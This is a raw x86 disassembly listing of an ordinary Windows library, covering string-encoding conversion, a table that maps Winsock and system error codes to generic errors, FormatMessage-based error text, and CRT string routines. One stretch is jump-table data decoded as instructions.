mov edx [ esp + 0x70 ]
push edx
push edi
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x74 ]
push edx
mov edx [ esp + 0x74 ]
push edx
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] 0x0
call eax
mov esi eax
test esi esi
je r-xdata
mov edx [ esp + 0x74 ]
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x70 ]
push edx
push eax
push edi
call sub_10025f10
pop edi
pop esi
add esp 0x54
retn
push r--data
call sub_10026510
push eax
push esi
lea ecx [ esp + 0x1c ]
call sub_10025d90
push r--data
lea ecx [ esp + 0x14 ]
push ecx
call sub_1002ae74
sub_100260e0
push 0xffffffff
push sub_1004e8fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x124 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x138 ]
mov edi [ esp + 0x13c ]
mov eax [ esp + 0x140 ]
mov ebx [ esp + 0x134 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] eax
test esi esi
jne r-xdata
cmp ebx esi
je r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ esp + 0x124 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10c ]
xor ecx esp
call sub_10027150
add esp 0x11c
retn
mov ecx esi
sub ecx ebx
sar ecx 0x1
lea ebp [ ecx * 4 + 0x4 ]
cmp ebp 0x100
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
lea eax [ esp + 0x128 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push esi
push ebx
call sub_10026060
add esp 0x18
push ebp
call sub_10022df7
mov edi eax
mov [ esp + 0x20 ] edi
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
push edx
push eax
lea ecx [ edi + ebp ]
push ecx
push edi
push esi
push ebx
mov [ esp + 0x148 ] 0x0
call sub_10026060
push edi
call sub_10027c56
add esp 0x20
jmp r-xdata
sub eax edx
sar eax 0x1
lea esi [ ebx + eax * 2 ]
sub_10026200
sub esp 0x54
mov ecx [ esp + 0x6c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push esi
push edi
mov edi [ esp + 0x68 ]
lea edx [ esp + 0x74 ]
push edx
mov edx [ esp + 0x70 ]
push edx
push edi
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x74 ]
push edx
mov edx [ esp + 0x74 ]
push edx
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x24 ] 0x0
call eax
mov esi eax
test esi esi
je r-xdata
mov edx [ esp + 0x74 ]
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x70 ]
push edx
push eax
push edi
call sub_10025fb0
pop edi
pop esi
add esp 0x54
retn
push r--data
call sub_10026510
push eax
push esi
lea ecx [ esp + 0x1c ]
call sub_10025d90
push r--data
lea ecx [ esp + 0x14 ]
push ecx
call sub_1002ae74
sub_10026280
push 0xffffffff
push sub_1004e93b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x210
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x224 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x238 ]
mov edi [ esp + 0x23c ]
mov eax [ esp + 0x240 ]
mov ebp [ esp + 0x234 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] eax
test esi esi
jne r-xdata
cmp ebp esi
je r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x224 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x20c ]
xor ecx esp
call sub_10027150
add esp 0x21c
retn
mov ebx esi
sub ebx ebp
lea ebx [ ebx + ebx * 2 ]
cmp ebx 0x100
jbe r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + ebp ]
mov eax [ esp + 0x14 ]
push eax
push edi
lea ecx [ esp + 0x228 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push esi
push ebp
call sub_10026200
add esp 0x18
xor ecx ecx
mov eax ebx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10022df7
mov edi eax
mov [ esp + 0x20 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push eax
push ecx
lea edx [ edi + ebx * 2 ]
push edx
push edi
push esi
push ebp
mov [ esp + 0x248 ] 0x0
call sub_10026200
push edi
call sub_10027c56
add esp 0x20
jmp r-xdata
sub_100263a0
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edi [ esp + 0x14 ]
neg eax
sbb eax eax
sub ecx esi
sar ecx 0x1
push ecx
mov ecx [ esp + 0x14 ]
push esi
mov edx edi
sub edx ecx
push edx
push ecx
and eax 0x2
inc eax
push 0x1
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
mov [ ecx ] edi
lea eax [ esi + eax * 2 ]
mov [ edx ] eax
xor ecx ecx
pop edi
mov [ eax ] cx
xor eax eax
pop esi
retn 0x1c
pop edi
mov eax 0x2
pop esi
retn 0x1c
sub_10026400
push esi
push edi
call [ AreFileApisANSI@IAT ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edi [ esp + 0x14 ]
push 0x0
neg eax
sbb eax eax
push 0x0
sub ecx esi
push ecx
mov ecx [ esp + 0x1c ]
push esi
mov edx edi
sub edx ecx
sar edx 0x1
push edx
push ecx
and eax 0x2
inc eax
push 0x400
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
add eax esi
mov [ ecx ] edi
mov [ edx ] eax
pop edi
mov [ eax ] 0x0
xor eax eax
pop esi
retn 0x1c
pop edi
mov eax 0x2
pop esi
retn 0x1c
sub_100264a0
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0xc ]
sub esp 0x8
push edx
lea edx [ esp + 0x4 ]
push edx
call eax
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
xor eax eax
add esp 0x8
retn 0x8
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
mov eax 0x1
add esp 0x8
retn 0x8
sub_10026510
push 0xffffffff
push sub_1004e97e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_100537c0
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_1002c1a3
add esp 0x4
sub_10026580
push 0xffffffff
push sub_1004e9b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esp + 0xc ] esi
mov [ esi + 0x4 ] al
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x8 ] 0x1
cmp eax 0x3
ja r-xdata
push 0xd
push r--data
jmp [ eax * 4 + jump_table_10026624 ]
push 0x2
push r--data
jmp r-xdata
push 0x7
push r--data
jmp r-xdata
push 0x5
push r--data
jmp r-xdata
push 0x6
push r--data
jmp r-xdata
mov ecx esi
call sub_10001e2d
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x14
retn 0x8
sub_10026670
push 0xffffffff
push sub_1004e9ee
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_100537d0
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_1002c1a3
add esp 0x4
sub_100266e0
push 0xffffffff
push sub_1004ea1e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push sub_100537e0
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] r--data
call sub_1002c1a3
add esp 0x4
sub_10026750
push esi
mov esi [ esp + 0xc ]
cmp esi 0x10b
jg r-xdata
cmp esi 0x2714
jg r-xdata
je r-xdata
lea eax [ esi - 0x2719 ]
cmp eax 0x38
ja r-xdata
je r-xdata
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x16
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0xd4
ja r-xdata
call sub_10026670
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
movzx edx [ eax + lookup_table_10026e00 ]
jmp [ edx * 4 + jump_table_10026d84 ]
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
cmp esi 0x3f5
jg r-xdata
movzx eax [ esi + lookup_table_10026c88 ]
jmp [ eax * 4 + jump_table_10026c40 ]
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x18
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ae
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26af
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ad
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b4
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b6
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xe
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c8
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26b9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ba
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26bd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c1
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c3
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c9
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26cd
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26d2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26ca
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
mov eax esi
sub eax 0x4d5
je r-xdata
je r-xdata
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x11
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x13
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x29
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x1c
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x28
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x27
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xc
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0xb
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x12
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x5
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x10
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub eax 0x48c
je r-xdata
lea eax [ esi - 0x3e3 ]
cmp eax 0x11
ja r-xdata
sub eax 0x3
jne r-xdata
movzx ecx [ eax + lookup_table_10026d70 ]
jmp [ ecx * 4 + jump_table_10026d60 ]
call sub_100266e0
mov ecx eax
mov eax [ esp + 0x8 ]
mov [ eax ] 0x26c7
mov [ eax + 0x4 ] ecx
pop esi
retn 0x8
sub_10026c9a
adc [ edi + eax ] eax
or [ ecx ] edx
adc [ ecx ] edx
or dl [ ecx ]
adc [ ecx ] edx
or cl [ edx ]
adc [ ebx + ecx ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx + edx ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
pop es
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11110411
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edx ] ecx
push cs
or al 0x11
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ 0x11111111 ] eax
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
movups [ ecx ] xmm2
adc [ ecx ] dl
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ edi ] ecx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or eax 0x11111111
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
adc [ ecx ] edx
or ecx [ ebp + 0x69220049 ]
add dl [ eax ]
movsb [ edi ] [ esi ]
imul eax [ edx ] 0x2690a10
adc [ esp + ebp * 2 ] ch
add dl [ eax ]
add [ ebx ] al
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ edx ]
mov edi edi
sbb al 0x6a
add dl [ eax ]
movsb [ edi ] [ esi ]
imul eax [ edx ] 0x26a9410
adc [ ecx + 0x68 ] al
add dl [ eax ]
mov ecx 0x14100268
insb
add dl [ eax ]
les ebp [ edx + 0x2 ]
adc [ edx + ebp * 2 ] al
add dl [ eax ]
pushfd
imul eax [ edx ] 0x10
jl r-xdata
push ds
push ds
push ds
push ds
push ds
push ds
add eax 0x9080706
or cl [ ebx ]
or al 0xd
push ds
push cs
push ds
movups xmm2 [ ecx ]
adc dl [ ebx ]
adc al 0x15
push ss
pop ss
sbb [ ecx ] bl
push ds
push ds
sbb bl [ ebx ]
push ds
sbb al 0x1e
sbb eax 0xcccccccc
int3
add dl [ eax ]
hlt
sub_10026e40
push 0xffffffff
push sub_1004ea80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0xc ] ebx
test [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0x40 ]
push eax
call sub_1002e6d3
add esp 0x4
test eax eax
je r-xdata
mov eax 0x1
or [ rw-data ] eax
push 0xd
push r--data
mov ecx rw-data
mov [ esp + 0x3c ] eax
mov [ rw-data ] 0xf
mov [ rw-data ] ebx
mov [ rw-data ] bl
call sub_10001e2d
push sub_100537f0
call sub_1002c1a3
add esp 0x4
mov [ esp + 0x34 ] bl
mov eax rw-data
mov ecx eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
lea esi [ ecx + 0x1 ]
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x2c
retn 0x8
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_10001e2d
mov ebx 0x1
lea eax [ esp + 0x10 ]
mov [ esp + 0x34 ] 0x2
mov [ esp + 0xc ] ebx
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_100272e8
add esp 0x4
mov esi [ esp + 0x3c ]
push 0xffffffff
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push eax
mov ecx esi
mov [ esi + 0x4 ] 0x0
call sub_100021c3
or ebx 0x2
test bl 0x1
je r-xdata
sub_10026f70
push 0xffffffff
push sub_1004eac9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x44 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x58 ]
mov edi [ esp + 0x54 ]
xor ebx ebx
push ebx
push ebx
lea eax [ esp + 0x1c ]
push eax
push 0x400
push ecx
push ebx
mov [ esp + 0x30 ] ebx
push 0x1300
mov [ esp + 0x38 ] edi
mov [ esp + 0x30 ] ebx
call [ FormatMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov ebp ecx
mov [ esp + 0x20 ] ebp
mov esi 0x1
mov [ esp + 0x4c ] esi
cmp eax ebx
jne r-xdata
mov eax ecx
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
lea esi [ eax + 0x1 ]
push 0xd
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] ebx
push r--data
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_10001e2d
mov [ esp + 0x18 ] esi
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ esp + 0x2c ]
call sub_10001e2d
mov eax [ esp + 0x38 ]
mov [ esp + 0x4c ] 0x2
cmp eax ebx
je r-xdata
push ebp
mov [ esp + 0x50 ] bl
call [ LocalFree@IAT ]
mov eax edi
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_10027150
add esp 0x3c
retn 0x8
push 0xffffffff
push ebx
lea edx [ esp + 0x2c ]
mov esi 0xf
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ebx
push edx
mov ecx edi
mov [ edi + 0x4 ] bl
call sub_100021c3
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x18 ] 0x1
jb r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
mov [ esp + 0x3c ] esi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x28 ] bl
mov eax [ esp + 0x28 ]
push eax
call sub_100272e8
add esp 0x4
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10027827
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xa
je r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10001f47
mov eax [ esp + 0x38 ]
cmp eax ebx
jne r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
jmp r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10027827
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0xd
jne r-xdata
lea ecx [ esp + 0x28 ]
cmp eax ebx
je r-xdata
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
cmp [ esp + 0x3c ] 0x10
mov ecx [ esp + 0x28 ]
jae r-xdata
call sub_10027827
mov eax [ esp + 0x38 ]
cmp [ ecx + esi ] 0x2e
jne r-xdata
lea ecx [ esp + 0x28 ]
push 0xffffffff
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_10001f47
sub_10027160
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100271f0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10027200
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_100272f3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
